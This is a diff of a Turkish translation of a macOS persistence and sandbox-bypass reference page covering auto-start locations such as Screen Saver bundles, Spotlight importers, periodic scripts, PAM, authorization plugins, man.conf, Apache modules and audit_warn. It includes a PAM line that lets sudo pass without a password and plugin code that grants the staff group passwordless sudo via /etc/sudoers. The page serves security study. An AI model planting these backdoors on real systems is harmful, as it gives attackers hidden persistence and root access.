 **Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)
 
-- Sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı execute etmeniz gerekir**
+- Useful to bypass sandbox: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
 - TCC bypass: ???
 
 #### Konum
@@ -958,38 +960,38 @@ Library'nizi yükleyen binary'nin **çok kısıtlayıcı bir sandbox** kullandı
 
 Finder Sync Extension içeren bir uygulama örneği [**burada bulunabilir**](https://github.com/D00MFist/InSync).
 
-Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, execute edilecek bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kendi kodunu execute edebilmesi için **geçerli bir Apple developer certificate ile imzalanmış olması**, **sandboxed** olması (rahatlatılmış istisnalar eklenebilmesine rağmen) ve aşağıdakine benzer bir şeyle register edilmesi gerekir:
+Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple developer certificate ile imzalanmış**, **sandboxed** (ancak daha esnek istisnalar eklenebilir) olması ve şuna benzer bir şeyle kaydedilmesi gerekir:<sup>[21][22]</sup>
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
 ```
-### Screen Saver
+### Ekran Koruyucu
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
 Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
 
-- sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
-- Ancak common application sandbox içinde sonlanırsınız
+- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Ancak sonunda common application sandbox içinde olacaksınız
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
 - `/System/Library/Screen Savers`
-- Root gerekir
-- **Trigger**: Screen Saver'ı seçin
+- Root gerekli
+- **Tetikleyici**: Ekran koruyucuyu seçin
 - `/Library/Screen Savers`
-- Root gerekir
-- **Trigger**: Screen Saver'ı seçin
+- Root gerekli
+- **Tetikleyici**: Ekran koruyucuyu seçin
 - `~/Library/Screen Savers`
-- **Trigger**: Screen Saver'ı seçin
+- **Tetikleyici**: Ekran koruyucuyu seçin
 
 <figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
 
 #### Açıklama ve Exploit
 
-Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.
+Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak üzere template'i seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.<sup>[23][24]</sup>
 
-**Derleyin** ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterli; çok sayıda log oluşturması gerekir:
+**Build** işlemini gerçekleştirin ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterlidir; çok sayıda log oluşturulmalıdır:
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'
 
@@ -999,9 +1001,9 @@ Timestamp                       (process)[PID]
 2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
 ```
 > [!CAUTION]
-> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunduğundan, **common application sandbox'ın içinde olacağınızı** unutmayın.
+> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunması nedeniyle **common application sandbox** içinde olacağınızı unutmayın.
 
-Saver code:
+Saver kodu:
 ```objectivec
 //
 //  ScreenSaverExampleView.m
@@ -1067,14 +1069,14 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 @end
 ```
-### Spotlight Plugins
+### Spotlight Eklentileri
 
 writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)
 
-- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
 - Ancak bir application sandbox içinde kalırsınız
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-- Sandbox oldukça kısıtlı görünüyor
+- Sandbox oldukça kısıtlı görünür
 
 #### Konum
 
@@ -1082,24 +1084,24 @@ writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.g
 - **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
 - `/Library/Spotlight/`
 - **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
-- Root gerekir
+- Root gereklidir
 - `/System/Library/Spotlight/`
 - **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
-- Root gerekir
+- Root gereklidir
 - `Some.app/Contents/Library/Spotlight/`
 - **Tetikleyici**: Spotlight plugin tarafından yönetilen uzantıya sahip yeni bir dosya oluşturulur.
-- Yeni bir app gerekir
+- Yeni bir app gereklidir
 
 #### Açıklama ve Exploitation
 
 Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'un yerleşik arama özelliğidir.\
-Bu hızlı arama özelliğini kolaylaştırmak için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir index oluşturur; böylece hem dosya adları hem de içerikleri arasında hızlı arama yapılabilir.
+Bu hızlı arama yeteneğini mümkün kılmak için Spotlight, **özel bir database** tutar ve **çoğu dosyayı parse ederek** bir index oluşturur; böylece hem dosya adları hem de içerikleri arasında hızlı aramalar yapılabilir.<sup>[25]</sup>
 
-Spotlight'ın temel mekanizması, **'metadata server'** anlamına gelen 'mds' adlı merkezi bir process içerir. Bu process, Spotlight servisinin tamamını yönetir. Buna ek olarak, farklı dosya türlerini indexlemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya Spotlight'ın çok çeşitli dosya formatlarındaki içeriği anlamasını ve indexlemesini sağlayan **".mdimporter bundles"** aracılığıyla gerçekleştirilir.
+Spotlight'ın temel mekanizmasında, adını **'metadata server'** ifadesinden alan 'mds' isimli merkezi bir process bulunur. Bu process, tüm Spotlight service'ini yönetir. Buna ek olarak, farklı dosya türlerini index'lemek gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight importer plugin'leri veya **".mdimporter bundle"**'ları aracılığıyla mümkün olur; bunlar Spotlight'ın çok çeşitli dosya formatlarındaki içerikleri anlamasını ve index'lemesini sağlar.
 
-Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında bir dakika içinde yüklenir (herhangi bir servisi yeniden başlatmaya gerek yoktur). Bu bundle'ların **hangi dosya türlerini ve uzantılarını yönetebileceklerini belirtmeleri** gerekir; böylece Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.
+Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıkarsa bir dakika içinde yüklenir (herhangi bir service'i yeniden başlatmaya gerek yoktur). Bu bundle'ların, **hangi dosya türlerini ve uzantılarını yönetebileceklerini** belirtmeleri gerekir; böylece Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.
 
-Yüklü olan tüm `mdimporters`'ları şu komutla bulmak mümkündür:
+Yüklenmiş tüm `mdimporters`'ı şu komutu çalıştırarak **bulmak** mümkündür:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1108,7 +1110,7 @@ Paths: id(501) (
 "/System/Library/Spotlight/PDF.mdimporter",
 [...]
 ```
-Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
+Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, şu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
@@ -1145,14 +1147,14 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 > [!CAUTION]
-> Diğer `mdimporter` öğelerinin Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesinin gerekmemesidir.
+> Diğer `mdimporter` öğelerinin Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesine gerek olmamasıdır.
 >
-> Ayrıca, System default plugin'leri her zaman önceliklidir; bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde indexlenmeyen dosyalara erişebilir.
+> Ayrıca, System varsayılan plugin'leri her zaman önceliklidir; bu nedenle bir attacker yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde index'lenmeyen dosyalara erişebilir.
 
-Kendi importer'ınızı oluşturmak için şu projeyle başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer); ardından adı, **`CFBundleDocumentTypes`** değerini değiştirin ve desteklemek istediğiniz uzantıyı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin; bunları **`schema.xml`** içinde yansıtın.\
-Ardından, işlenen uzantıya sahip bir dosya oluşturulduğunda payload'unuzu çalıştırması için **`GetMetadataForFile`** fonksiyonunun kodunu **değiştirin**.
+Kendi importer'ınızı oluşturmak için şu project ile başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer); ardından adı ve **`CFBundleDocumentTypes`** değerini değiştirin, desteklemek istediğiniz extension'ı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin ve bunları **`schema.xml`** içinde belirtin.\
+Ardından, işlenen extension'a sahip bir dosya oluşturulduğunda payload'unuzu execute etmesi için **`GetMetadataForFile`** function'ının kodunu **değiştirin**.
 
-Son olarak yeni **`.mdimporter`** dosyanızı build edip önceki konumlardan birine kopyalayın; ardından **log'ları izleyerek** veya **`mdimport -L.`** komutunu kontrol ederek ne zaman yüklendiğini kontrol edebilirsiniz.
+Son olarak yeni **`.mdimporter`** dosyanızı build edip önceki üç location'dan birine copy'layın; ardından **log'ları monitoring** ederek veya **`mdimport -L.`** kontrolüyle ne zaman yüklendiğini kontrol edebilirsiniz.
 
 ### ~~Preference Pane~~
 
@@ -1161,8 +1163,8 @@ Son olarak yeni **`.mdimporter`** dosyanızı build edip önceki konumlardan bir
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)
 
-- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
-- Belirli bir kullanıcı eylemi gerektirir
+- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Belirli bir user action gerektirir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Location
@@ -1173,33 +1175,33 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.g
 
 #### Description
 
-Bunun artık çalışıyor gibi görünmediğini unutmayın.
+Bunun artık çalışıyor gibi görünmediğini unutmayın.<sup>[26]</sup>
 
 ## Root Sandbox Bypass
 
 > [!TIP]
-> Burada, **root** olarak **bir dosyaya yazarak** bir şeyi basitçe çalıştırmanıza olanak tanıyan ve/veya başka **tuhaf koşullar** gerektiren **sandbox bypass** için kullanışlı start location'ları bulabilirsiniz.
+> Burada, **sandbox bypass** için yararlı olan; yalnızca **root** olarak bir dosyaya **yazarak** bir şeyi execute etmenize olanak tanıyan ve/veya başka **garip koşullar** gerektiren start location'ları bulabilirsiniz.
 
 ### Periodic
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)
 
-- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
 - Ancak root olmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Location
 
 - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
-- Root gereklidir
+- Root gerekir
 - **Trigger**: Zamanı geldiğinde
 - `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
-- Root gereklidir
+- Root gerekir
 - **Trigger**: Zamanı geldiğinde
 
 #### Description & Exploitation
 
-Periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` içinde yapılandırılmış **launch daemon**'ları nedeniyle çalıştırılır. `/etc/periodic/` içinde depolanan script'lerin **dosyanın sahibi** olarak çalıştırıldığını unutmayın; bu nedenle bu yöntem olası bir privilege escalation için çalışmaz.
+Periodic script'leri (**`/etc/periodic`**), **`/System/Library/LaunchDaemons/com.apple.periodic*`** içinde configure edilmiş **launch daemon**'lar nedeniyle execute edilir. `/etc/periodic/` içinde saklanan script'lerin **dosyanın owner'ı olarak execute edildiğini** unutmayın; bu nedenle olası bir privilege escalation için çalışmaz.<sup>[27]</sup>
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1230,17 +1232,17 @@ total 24
 total 8
 -rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
 ```
-**`/etc/defaults/periodic.conf`** içinde belirtilen ve çalıştırılacak başka periodic scriptler de vardır:
+Çalıştırılacak diğer periyodik script'ler **`/etc/defaults/periodic.conf`** içinde belirtilmiştir:
 ```bash
 grep "Local scripts" /etc/defaults/periodic.conf
 daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-`/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, bu dosya **er ya da geç çalıştırılır**.
+Herhangi bir şekilde `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından birini yazabiliyorsanız, bu dosya **er ya da geç çalıştırılır**.
 
 > [!WARNING]
-> Periodic script'in, **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script o kullanıcı olarak çalıştırılır (bu durum privilege escalation saldırılarını engelleyebilir).
+> Periodic script'in, **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script bu kullanıcı olarak çalıştırılır (bu durum privilege escalation saldırılarını engelleyebilir).
 
 ### PAM
 
@@ -1251,23 +1253,23 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.g
 - Ancak root olmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Konum
 
 - Her zaman root gerekir
 
-#### Description & Exploitation
+#### Açıklama ve Exploitation
 
-PAM, macOS içinde kolay çalıştırmadan ziyade **persistence** ve malware üzerine odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.
+PAM, macOS içinde kolay execution'dan ziyade **persistence** ve malware üzerine odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.<sup>[28]</sup>
 
 PAM modüllerini şu komutla kontrol edin:
 ```bash
 ls -l /etc/pam.d
 ```
-PAM'i kötüye kullanan bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başlangıcına şu satırı eklemek kadar kolaydır:
+PAM'i abuse eden bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:
 ```bash
 auth       sufficient     pam_permit.so
 ```
-Yani **şuna benzeyecek**:
+Yani **şuna benzer** bir şey görünecek:
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1281,9 +1283,9 @@ session    required       pam_permit.so
 Ve bu nedenle **`sudo` kullanma girişimleri başarılı olacaktır**.
 
 > [!CAUTION]
-> Bu dizinin TCC tarafından korunduğunu unutmayın; bu nedenle kullanıcının erişim isteyen bir istem alması oldukça olasıdır.
+> Bu dizinin TCC tarafından korunduğunu, bu nedenle kullanıcının erişim isteyen bir istem almasının son derece muhtemel olduğunu unutmayın.
 
-Bir diğer güzel örnek `su`'dur; burada PAM modules'a parametreler vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da ekleyebilirsiniz):
+Bir başka güzel örnek de `su`'dur; burada PAM modules'a parametreler vermenin de mümkün olduğunu görebilirsiniz (ayrıca bu dosyaya backdoor da yerleştirebilirsiniz):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1300,18 +1302,18 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.g
 Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
 - sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
-- Ancak root olmanız ve ek config'ler yapmanız gerekir
+- Ancak root olmanız ve ekstra config'ler yapmanız gerekir
 - TCC bypass: ???
 
 #### Konum
 
 - `/Library/Security/SecurityAgentPlugins/`
-- Root gerekir
+- Root gereklidir
 - Plugin'i kullanacak şekilde authorization database'i yapılandırmak da gerekir
 
 #### Açıklama ve Exploitation
 
-Persistence sağlamak amacıyla kullanıcı giriş yaptığında çalıştırılacak bir authorization plugin oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sisteminize erişiminizi engelleyebilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).
+Bir kullanıcı login yaptığında persistence sağlamak için çalıştırılacak bir authorization plugin'i oluşturabilirsiniz. Bu plugin'lerden birinin nasıl oluşturulacağı hakkında daha fazla bilgi için önceki writeup'lara bakın (ve dikkatli olun; kötü yazılmış bir plugin sizi sistemin dışında bırakabilir ve Mac'inizi recovery mode'dan temizlemeniz gerekebilir).<sup>[29][30]</sup>
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1330,7 +1332,7 @@ system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
-Son olarak bu **Plugin**'i yüklemek için **rule**'u ekleyin:
+Son olarak, bu Plugin'i yüklemek için **rule** ekleyin:
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1349,37 +1351,37 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
-**`evaluate-mechanisms`**, authorization framework'üne **authorization için harici bir mechanism çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından yürütülmesini sağlar.
+**`evaluate-mechanisms`**, authorization framework'e **authorization için harici bir mechanism çağırması gerekeceğini** bildirir. Ayrıca **`privileged`**, bunun root tarafından çalıştırılmasını sağlar.
 
 Şununla tetikleyin:
 ```bash
 security authorize com.asdf.asdf
 ```
-Ve ardından **staff group should have sudo** erişimine sahip olmalıdır (onaylamak için `/etc/sudoers` dosyasını okuyun).
+Ve **staff grubu sudo** erişimine sahip olmalıdır (doğrulamak için `/etc/sudoers` dosyasını okuyun).
 
 ### Man.conf
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
 
-- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Sandbox bypass için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
 - Ancak root olmanız ve kullanıcının man kullanması gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Konum
 
 - **`/private/etc/man.conf`**
-- Root gerekir
+- Root gerektirir
 - **`/private/etc/man.conf`**: man her kullanıldığında
 
 #### Açıklama ve Exploit
 
-**`/private/etc/man.conf`** yapılandırma dosyası, man dokümantasyon dosyaları açılırken kullanılacak binary/script'i belirtir. Bu nedenle executable yolu değiştirilebilir; böylece kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılır.
+**`/private/etc/man.conf`** config dosyası, man documentation dosyalarını açarken kullanılacak binary/script'i belirtir. Bu nedenle executable yolu değiştirilebilir; böylece kullanıcı bazı dokümanları okumak için man kullandığında bir backdoor çalıştırılır.<sup>[31]</sup>
 
-Örneğin **`/private/etc/man.conf`** içinde şu şekilde ayarlayın:
+Örneğin **`/private/etc/man.conf`** içine şunu yazın:
 ```
 MANPAGER /tmp/view
 ```
-Ve ardından `/tmp/view` dosyasını şu şekilde oluşturun:
+Ardından `/tmp/view` dosyasını şu şekilde oluşturun:
 ```bash
 #!/bin/zsh
 
@@ -1389,12 +1391,12 @@ touch /tmp/manconf
 ```
 ### Apache2
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
+**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)
 
-- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
 - Ancak root olmanız ve apache'nin çalışıyor olması gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
-- Httpd'nin entitlements'ı yok
+- Httpd entitlements'a sahip değil
 
 #### Konum
 
@@ -1404,11 +1406,11 @@ touch /tmp/manconf
 
 #### Açıklama ve Exploit
 
-`/etc/apache2/httpd.conf` dosyasına aşağıdakine benzer bir satır ekleyerek bir modül yüklenmesini belirtebilirsiniz:
+`/etc/apache2/httpd.conf` içinde aşağıdaki gibi bir satır ekleyerek bir module yüklenmesini belirtebilirsiniz:<sup>[32]</sup>
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken ya onu **geçerli bir Apple certificate ile sign etmek** ya da sisteme **yeni bir trusted certificate ekleyip** onunla **sign etmektir**.
+Bu şekilde derlenmiş modülünüz Apache tarafından yüklenecektir. Tek yapmanız gereken, ya **geçerli bir Apple sertifikasıyla imzalamak** ya da sistemde **yeni bir güvenilir sertifika ekleyip** modülü bununla **imzalamaktır**.
 
 Ardından, gerekirse sunucunun başlatılacağından emin olmak için şunu çalıştırabilirsiniz:
 ```bash
@@ -1430,7 +1432,7 @@ syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)
 
-- sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
+- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
 - Ancak root olmanız, auditd'nin çalışıyor olması ve bir uyarıya neden olmanız gerekir
 - TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
@@ -1442,20 +1444,20 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.g
 
 #### Açıklama ve Exploit
 
-auditd bir uyarı algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.
+auditd bir uyarı algıladığında **`/etc/security/audit_warn`** script'i **çalıştırılır**. Bu nedenle payload'unuzu buraya ekleyebilirsiniz.<sup>[33]</sup>
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
-You could force a warning with `sudo audit -n`.
+`sudo audit -n` ile bir uyarı verilmesini zorlayabilirsiniz.
 
-### Startup Items
+### Başlangıç Öğeleri
 
-> [!CAUTION] > **This is deprecated, so nothing should be found in those directories.**
+> [!CAUTION] > **Bu kullanım dışıdır, bu nedenle bu dizinlerde hiçbir şey bulunmamalıdır.**
 
-The **StartupItem** is a directory that should be positioned within either `/Library/StartupItems/` or `/System/Library/StartupItems/`. Once this directory is established, it must encompass two specific files:
+**StartupItem**, `/Library/StartupItems/` veya `/System/Library/StartupItems/` içinde bulunması gereken bir dizindir. Bu dizin oluşturulduktan sonra iki özel dosya içermelidir:
 
-1. An **rc script**: Başlangıçta çalıştırılan bir shell script'i.
-2. A **plist file**, specifically named `StartupParameters.plist`, which contains various configuration settings.
+1. Bir **rc script'i**: Başlangıçta çalıştırılan bir shell script'i.
+2. Özellikle `StartupParameters.plist` olarak adlandırılmış bir **plist dosyası**; bu dosya çeşitli yapılandırma ayarlarını içerir.
 
 Başlangıç işleminin bunları tanıyıp kullanabilmesi için hem rc script'inin hem de `StartupParameters.plist` dosyasının **StartupItem** dizininin içine doğru şekilde yerleştirildiğinden emin olun.
 
@@ -1504,13 +1506,13 @@ RunService "$1"
 ### ~~emond~~
 
 > [!CAUTION]
-> Bu bileşeni macOS'umda bulamadım; daha fazla bilgi için writeup'a bakın
+> Bu bileşeni macOS'umda bulamıyorum; daha fazla bilgi için writeup'a bakın
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
-Apple tarafından tanıtılan **emond**, az geliştirilmiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından fark edilmeyecek incelikli bir persistence yöntemi olarak kullanılabilir.
+Apple tarafından kullanıma sunulan **emond**, yeterince geliştirilmemiş veya muhtemelen terk edilmiş gibi görünen, ancak hâlâ erişilebilir olan bir logging mekanizmasıdır. Bir Mac yöneticisi için özellikle faydalı olmasa da bu belirsiz servis, threat actor'lar için çoğu macOS admin'i tarafından muhtemelen fark edilmeyecek, gizli bir persistence yöntemi olarak kullanılabilir.<sup>[34]</sup>
 
-Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Bu servisin sistemdeki LaunchDaemon'u, yürütülecek script'leri tek bir dizinde arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
+Varlığından haberdar olanlar için **emond**'un kötü amaçlı kullanımını tespit etmek oldukça kolaydır. Sistemin bu servise ait LaunchDaemon'u, tek bir dizinde çalıştırılacak script'leri arar. Bunu incelemek için aşağıdaki komut kullanılabilir:
 ```bash
 ls -l /private/var/db/emondClients
 ```
@@ -1521,28 +1523,28 @@ Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.g
 #### Konum
 
 - **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
-- Root gereklidir
+- Root gerekli
 - **Tetikleyici**: XQuartz ile
 
 #### Açıklama ve Exploit
 
-XQuartz artık **macOS'ta kurulu olarak gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.
+XQuartz artık **macOS'ta yüklü olarak gelmiyor**, bu nedenle daha fazla bilgi istiyorsanız writeup'a bakın.<sup>[3]</sup>
 
 ### ~~kext~~
 
 > [!CAUTION]
-> Root olarak bile kext kurmak o kadar karmaşıktır ki bir exploit'iniz olmadığı sürece bunu sandbox'lardan kaçmak veya persistence için değerlendirmeyeceğim.
+> Root olarak bile kext yüklemek o kadar karmaşıktır ki (bir exploit'iniz yoksa) bunu sandbox'lardan kaçış veya persistence için değerlendirmeyeceğim.
 
 #### Konum
 
-Bir KEXT'yi startup item olarak kurmak için **aşağıdaki konumlardan birine kurulması gerekir**:
+Bir KEXT'i startup item olarak yüklemek için **aşağıdaki konumlardan birine** yüklenmesi gerekir:
 
 - `/System/Library/Extensions`
 - OS X işletim sistemine yerleşik KEXT dosyaları.
 - `/Library/Extensions`
-- 3rd party software tarafından kurulan KEXT dosyaları
+- 3rd party software tarafından yüklenen KEXT dosyaları
 
-Şu anda yüklenmiş kext dosyalarını şu komutla listeleyebilirsiniz:
